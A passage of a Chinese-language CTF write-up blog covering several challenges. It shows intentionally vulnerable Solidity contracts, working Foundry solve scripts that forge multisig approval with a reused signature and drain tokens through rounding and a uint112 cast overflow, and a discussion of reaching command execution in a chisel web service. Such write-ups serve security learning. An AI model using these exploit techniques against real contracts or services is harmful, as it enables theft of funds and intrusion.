class="line">        }</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            vm.startBroadcast(privateKey);</span><br><span class="line"></span><br><span class="line">            address guardian1 = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;</span><br><span class="line">            address guardian2 = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;</span><br><span class="line">            address guardian3 = player;</span><br><span class="line"></span><br><span class="line">            t(guardian1, 10 ether);</span><br><span class="line">            t(guardian2, 10 ether);</span><br><span class="line">            t(guardian3, 10 ether);</span><br><span class="line"></span><br><span class="line">            cartel = new CartelTreasury();</span><br><span class="line">            address[] memory guardians = new address[](3);</span><br><span class="line">            guardians[0] = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;</span><br><span class="line">            guardians[1] = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;</span><br><span class="line">            guardians[2] = player;</span><br><span class="line">            address bodyguard = address(new BodyGuard(address(cartel), guardians));</span><br><span class="line"></span><br><span class="line">            cartel.initialize(bodyguard);</span><br><span class="line">            t(address(cartel), 777 ether);</span><br><span class="line"></span><br><span class="line">            vm.stopBroadcast();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        vm.startBroadcast(system);</span><br><span class="line">        challenge = new Challenge(address(cartel));</span><br><span class="line">        vm.stopBroadcast();    </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function t(address r, uint256 v) internal {</span><br><span class="line">        (bool success,) = r.call{value: v}("");</span><br><span class="line">        require(success, "Failed to send ETH");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * CODE YOUR SOLUTION HERE</span><br><span class="line">     */</span><br><span class="line">    function test_solve() public checkSolvedByPlayer {</span><br><span class="line">        CartelTreasury cartel = CartelTreasury(payable(challenge.TREASURY()));</span><br><span class="line">        BodyGuard guard = BodyGuard(cartel.bodyGuard());</span><br><span class="line"></span><br><span class="line">        BodyGuard.Proposal memory proposal = BodyGuard.Proposal({</span><br><span class="line">            expiredAt: uint32(block.timestamp + 1 days),</span><br><span class="line">            gas: 100000,</span><br><span class="line">            data: abi.encodeWithSignature("gistCartelDismiss()"),</span><br><span class="line">            nonce: 1</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        bytes32 proposalHash = guard.hashProposal(proposal);</span><br><span class="line">        bytes[] memory signaturesSortedBySigners = new bytes[](2);</span><br><span class="line"></span><br><span class="line">        uint8 v; bytes32 r; bytes32 s;</span><br><span class="line">        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">        signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);</span><br><span class="line"></span><br><span class="line">        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">        signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));</span><br><span class="line"></span><br><span class="line">        guard.propose(proposal, signaturesSortedBySigners);</span><br><span class="line"></span><br><span class="line">        cartel.doom();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line">     */</span><br><span class="line">    function _isSolved() private view {</span><br><span class="line">        require(challenge.isSolved() == true, "Challenge not solved");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge <span class="built_in">test</span> -vvvv</span><br></pre></td></tr></table></figure></div>

<hr>
<p>分隔線上是賽中解的，這次有一堆題目都差一點就解的。感覺蠻適合進步用。整體難度應該算對我學習蠻優良的。</p>
<h3 id="8Inch"><a href="#8Inch" class="headerlink" title="8Inch"></a>8Inch</h3><h4 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "./ERC20.sol";</span><br><span class="line">import "./SafeUint112.sol";</span><br><span class="line">import "forge-std/console.sol";</span><br><span class="line"></span><br><span class="line">contract TradeSettlement is SafeUint112 {</span><br><span class="line">    struct Trade {</span><br><span class="line">        address maker;</span><br><span class="line">        address taker;</span><br><span class="line">        address tokenToSell;</span><br><span class="line">        address tokenToBuy;</span><br><span class="line">        uint112 amountToSell;</span><br><span class="line">        uint112 amountToBuy;</span><br><span class="line">        uint112 filledAmountToSell;</span><br><span class="line">        uint112 filledAmountToBuy;</span><br><span class="line">        bool isActive;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mapping(uint256 =&gt; Trade) public trades;</span><br><span class="line">    uint256 public nextTradeId;</span><br><span class="line">    bool private locked;</span><br><span class="line">    uint256 public fee = 30 wei;</span><br><span class="line"></span><br><span class="line">    event TradeCreated(uint256 indexed tradeId, address indexed maker, address tokenToSell, address tokenToBuy, uint256 amountToSell, uint256 amountToBuy);</span><br><span class="line">    event TradeSettled(uint256 indexed tradeId, address indexed settler, uint256 settledAmountToSell);</span><br><span class="line">    event TradeCancelled(uint256 indexed tradeId);</span><br><span class="line"></span><br><span class="line">    modifier nonReentrant() {</span><br><span class="line">        require(!locked, "ReentrancyGuard: reentrant call");</span><br><span class="line">        locked = true;</span><br><span class="line">        _;</span><br><span class="line">        locked = false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function createTrade(</span><br><span class="line">        address _tokenToSell,</span><br><span class="line">        address _tokenToBuy,</span><br><span class="line">        uint256 _amountToSell,</span><br><span class="line">        uint256 _amountToBuy</span><br><span class="line">    ) external nonReentrant {</span><br><span class="line">        require(_tokenToSell != address(0) &amp;&amp; _tokenToBuy != address(0), "Invalid token addresses");</span><br><span class="line"></span><br><span class="line">        uint256 tradeId = nextTradeId++;</span><br><span class="line">        trades[tradeId] = Trade({</span><br><span class="line">            maker: msg.sender,</span><br><span class="line">            taker: address(0),</span><br><span class="line">            tokenToSell: _tokenToSell,</span><br><span class="line">            tokenToBuy: _tokenToBuy,</span><br><span class="line">            amountToSell: safeCast(_amountToSell - fee),</span><br><span class="line">            amountToBuy: safeCast(_amountToBuy),</span><br><span class="line">            filledAmountToSell: 0,</span><br><span class="line">            filledAmountToBuy: 0,</span><br><span class="line">            isActive: true</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line">        require(IERC20(_tokenToSell).transferFrom(msg.sender, address(this), _amountToSell), "Transfer failed");</span><br><span class="line"></span><br><span class="line">        emit TradeCreated(tradeId, msg.sender, _tokenToSell, _tokenToBuy, _amountToSell, _amountToBuy);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {</span><br><span class="line">        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line">        require(scale &gt; 0, "Invalid scale");</span><br><span class="line">        require(trade.filledAmountToBuy == 0, "Trade is already filled");</span><br><span class="line">        uint112 originalAmountToSell = trade.amountToSell;</span><br><span class="line">        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));</span><br><span class="line">        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));</span><br><span class="line">        uint256 newAmountNeededWithFee = safeCast(safeMul(originalAmountToSell, scale) + fee);</span><br><span class="line">        if (originalAmountToSell &lt; newAmountNeededWithFee) {</span><br><span class="line">            require(</span><br><span class="line">                IERC20(trade.tokenToSell).transferFrom(msg.sender, address(this), newAmountNeededWithFee - originalAmountToSell),</span><br><span class="line">                "Transfer failed"</span><br><span class="line">            );</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function settleTrade(uint256 _tradeId, uint256 _amountToSettle) external nonReentrant {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line">        require(_amountToSettle &gt; 0, "Invalid settlement amount");</span><br><span class="line">        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;</span><br><span class="line"></span><br><span class="line">        require(trade.filledAmountToSell + _amountToSettle &lt;= trade.amountToSell, "Exceeds available amount");</span><br><span class="line"></span><br><span class="line">        require(IERC20(trade.tokenToBuy).transferFrom(msg.sender, trade.maker, tradeAmount / trade.amountToSell), "Buy transfer failed");</span><br><span class="line">        require(IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle), "Sell transfer failed");</span><br><span class="line"></span><br><span class="line">        trade.filledAmountToSell += safeCast(_amountToSettle);</span><br><span class="line">        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);</span><br><span class="line"></span><br><span class="line">        if (trade.filledAmountToSell &gt; trade.amountToSell) {</span><br><span class="line">            trade.isActive = false;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function cancelTrade(uint256 _tradeId) external nonReentrant {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        require(msg.sender == trade.maker, "Only maker can cancel");</span><br><span class="line">        require(trade.isActive, "Trade is not active");</span><br><span class="line"></span><br><span class="line">        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;</span><br><span class="line">        if (remainingAmount &gt; 0) {</span><br><span class="line">            require(IERC20(trade.tokenToSell).transfer(trade.maker, remainingAmount), "Transfer failed");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        trade.isActive = false;</span><br><span class="line"></span><br><span class="line">        emit TradeCancelled(_tradeId);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getTrade(uint256 _tradeId) external view returns (</span><br><span class="line">        address maker,</span><br><span class="line">        address taker,</span><br><span class="line">        address tokenToSell,</span><br><span class="line">        address tokenToBuy,</span><br><span class="line">        uint256 amountToSell,</span><br><span class="line">        uint256 amountToBuy,</span><br><span class="line">        uint256 filledAmountToSell,</span><br><span class="line">        uint256 filledAmountToBuy,</span><br><span class="line">        bool isActive</span><br><span class="line">    ) {</span><br><span class="line">        Trade storage trade = trades[_tradeId];</span><br><span class="line">        return (</span><br><span class="line">            trade.maker,</span><br><span class="line">            trade.taker,</span><br><span class="line">            trade.tokenToSell,</span><br><span class="line">            trade.tokenToBuy,</span><br><span class="line">            trade.amountToSell,</span><br><span class="line">            trade.amountToBuy,</span><br><span class="line">            trade.filledAmountToSell,</span><br><span class="line">            trade.filledAmountToBuy,</span><br><span class="line">            trade.isActive</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Challenge {</span><br><span class="line">    TradeSettlement public tradeSettlement;</span><br><span class="line">    SimpleERC20 public wojak;</span><br><span class="line">    SimpleERC20 public weth;</span><br><span class="line"></span><br><span class="line">    constructor() {</span><br><span class="line">        tradeSettlement = new TradeSettlement();</span><br><span class="line"></span><br><span class="line">        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);</span><br><span class="line">        wojak = new SimpleERC20("Wojak", "WOJAK", 18, 10 ether);</span><br><span class="line"></span><br><span class="line">        wojak.approve(address(tradeSettlement), 10 ether);</span><br><span class="line"></span><br><span class="line">        // Sell 10 WOJAK for 1 weth</span><br><span class="line">        tradeSettlement.createTrade(address(wojak), address(weth), 10 ether, 1 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) {</span><br><span class="line">        return wojak.balanceOf(address(0xc0ffee)) &gt;= 10 ether;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h6 id="SafeUint112-sol"><a href="#SafeUint112-sol" class="headerlink" title="SafeUint112.sol"></a>SafeUint112.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SafeUint112 {</span><br><span class="line">    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow</span><br><span class="line">    function safeCast(uint256 value) internal pure returns (uint112) {</span><br><span class="line">        require(value &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow</span><br><span class="line">    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {</span><br><span class="line">        require(uint256(a) * b &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(a * b);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h4 id="題解-3"><a href="#題解-3" class="headerlink" title="題解"></a>題解</h4><p><code>tradeSettlement::settleTrade</code> 在判斷要收多少 token，使用了向下取整（<code>tradeAmount / trade.amountToSell</code>），可以藉此來免費買 token。如下，一次可以買到 9 個。要解題至少要拿 10 ether 個，所以只靠這個是不夠的。在賽中以為他的 <code>SafeUint112</code> 是安全的，所以賽中到這就沒繼續解了。但其實問題就在 其中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint256 fee = 30 wei;</span><br><span class="line">uint256 amountToSell = 10 ether - fee;</span><br><span class="line">uint256 amountToBuy = 1 ether;</span><br><span class="line">uint256 _amountToSettle = amountToSell / amountToBuy;</span><br><span class="line"></span><br><span class="line">require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");</span><br><span class="line"></span><br><span class="line">tradeSettlement.settleTrade(0, _amountToSettle);</span><br></pre></td></tr></table></figure></div>

<h5 id="SafeUint112"><a href="#SafeUint112" class="headerlink" title="SafeUint112"></a><code>SafeUint112</code></h5><p><code>SafeUint112.safeCast</code> 的 <code>value &lt;= (1 &lt;&lt; 112)</code> 應該要用 <code>&lt;</code>。不然在 <code>value = 1 &lt;&lt; 112</code> 時會 overflow。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract SafeUint112 {</span><br><span class="line">    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow</span><br><span class="line">    function safeCast(uint256 value) internal pure returns (uint112) {</span><br><span class="line">        require(value &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(value);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; uint256 a = 1 &lt;&lt; 112;</span><br><span class="line">&gt; console.log(uint112(a));</span><br><span class="line"></span><br><span class="line">Logs:</span><br><span class="line">  0</span><br></pre></td></tr></table></figure></div>

<h4 id="解題腳本"><a href="#解題腳本" class="headerlink" title="解題腳本"></a>解題腳本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Solve is CTFSolver {    </span><br><span class="line">    function solve(address challenge, address player) internal override {</span><br><span class="line">        TradeSettlement tradeSettlement = Challenge(challenge).tradeSettlement();</span><br><span class="line">        uint256 fee = 30 wei;</span><br><span class="line">        uint256 amountToSell = 10 ether - fee;</span><br><span class="line">        uint256 amountToBuy = 1 ether;</span><br><span class="line">        uint256 _amountToSettle = amountToSell / amountToBuy;</span><br><span class="line"></span><br><span class="line">        require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");</span><br><span class="line"></span><br><span class="line">        for (uint256 amountDrained = 0; amountDrained &lt; fee; amountDrained += _amountToSettle) </span><br><span class="line">            tradeSettlement.settleTrade(0, _amountToSettle);</span><br><span class="line"></span><br><span class="line">        SimpleERC20 wojak = Challenge(challenge).wojak();</span><br><span class="line">        wojak.approve(address(tradeSettlement), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tradeSettlement.createTrade(address(wojak), address(wojak), fee+1, 0);</span><br><span class="line"></span><br><span class="line">        // make `uint112(scale+fee) == 0` so we won't be charged when scaling</span><br><span class="line">        uint256 scale = (1 &lt;&lt; 112) - fee;</span><br><span class="line">        tradeSettlement.scaleTrade(1, scale);</span><br><span class="line"></span><br><span class="line">        tradeSettlement.settleTrade(1, wojak.balanceOf(address(tradeSettlement)));</span><br><span class="line">        wojak.transfer(address(0xc0ffee), 10 ether);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h3 id="Chisel-as-a-Service"><a href="#Chisel-as-a-Service" class="headerlink" title="Chisel as a Service"></a>Chisel as a Service</h3><h4 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h4><p>目標：取得 <code>/flag-&lt;flag_hash&gt;.txt</code> 內容</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">"express"</span>;</span><br><span class="line"><span class="keyword">import</span> { $ } <span class="keyword">from</span> <span class="string">"zx"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">"public"</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">"/run"</span>, <span class="title function_">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">const</span> code = <span class="title class_">String</span>(req.<span class="property">query</span>.<span class="property">code</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/^[\x20-\x7E\r\n]*$/</span>.<span class="title function_">test</span>(code) === <span class="literal">false</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Invalid characters"</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(code));</span><br><span class="line">    <span class="keyword">const</span> commands = code.<span class="title function_">toLowerCase</span>().<span class="title function_">match</span>(<span class="regexp">/![a-z]+/g</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(commands);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(commands !== <span class="literal">null</span> &amp;&amp; (commands.<span class="title function_">includes</span>(<span class="string">"!exec"</span>) || commands.<span class="title function_">includes</span>(<span class="string">"!e"</span>)));</span><br><span class="line">    <span class="keyword">if</span> (commands !== <span class="literal">null</span> &amp;&amp; (commands.<span class="title function_">includes</span>(<span class="string">"!exec"</span>) || commands.<span class="title function_">includes</span>(<span class="string">"!e"</span>)))</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"!exec is not allowed"</span>);</span><br><span class="line">    <span class="keyword">const</span> uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    <span class="keyword">await</span> $({</span><br><span class="line">      <span class="attr">cwd</span>: <span class="string">"public/out"</span>,</span><br><span class="line">      <span class="attr">timeout</span>: <span class="string">"3s"</span>,</span><br><span class="line">      <span class="attr">input</span>: code,</span><br><span class="line">    })<span class="string">`chisel --no-vm &gt; <span class="subst">${uuid}</span>`</span>;</span><br><span class="line">    res.<span class="title function_">send</span>({ uuid });</span><br><span class="line">  } <span class="keyword">catch</span> {</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">"error"</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="題解-4"><a href="#題解-4" class="headerlink" title="題解"></a>題解</h4><p>讀了一下 chisel 的 source code，發現有兩處使用了危險函數。</p>
<p><code>ChiselCommand::Exec</code> 的 <code>arg</code> 可控，但是在 JavaScript 端會進行過濾，不能出現 <code>!exec</code> 跟 <code>!e</code>。看了一下 rust 端怎麼 parse 的但沒找到繞過的方法。</p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L623">https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L623 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Exec =&gt; {</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> args.<span class="title function_ invoke__">len</span>() &gt; <span class="number">1</span> {</span><br><span class="line">        cmd.<span class="title function_ invoke__">args</span>(args[<span class="number">1</span>..].<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">copied</span>());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> cmd.<span class="title function_ invoke__">output</span>() {</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><code>ChiselCommand::Edit</code> 裡若可以控環境變數就能自由 RCE，所以要研究哪邊可以控環境變數。Foundry Cheatcode 有可以控環境變數的 <a class="link" target="_blank" rel="noopener" href="https://book.getfoundry.sh/cheatcodes/set-env">vm.setEnv <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但在 JavaScript 指定了 <code> --no-vm</code> 的參數所以沒有 <code>vm</code> 可以用，賽中沒有想到其他可控環境變數的方法。賽後得知其實在  <code> --no-vm</code> 情況下還是有辦法取得 <code>vm</code> 的。</p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L651">https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L651 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
